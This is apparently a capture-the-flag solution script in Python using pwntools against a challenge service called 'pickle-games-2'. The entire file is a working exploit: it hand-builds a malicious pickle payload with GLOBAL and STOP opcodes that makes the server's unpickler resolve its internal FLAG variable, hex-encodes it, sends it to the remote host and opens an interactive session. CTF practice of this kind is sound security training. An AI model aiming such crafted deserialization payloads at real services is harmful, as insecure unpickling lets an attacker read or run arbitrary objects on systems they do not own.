#!/usr/bin/env python3

from pwn import *
import pickle

HOST, PORT, SSL = "pickle-games-2.challs.shellmates.club", 443, True

PAYLOAD = flat(
    pickle.PROTO + b"\x04",
    pickle.GLOBAL + b"__main__\nFLAG\n",
    pickle.STOP,
)

if __name__ == "__main__":
    io = remote(HOST, PORT, ssl=SSL)
    data = PAYLOAD.hex().encode()
    io.recvuntil(b"data: ")
    io.sendline(data)
    io.interactive()
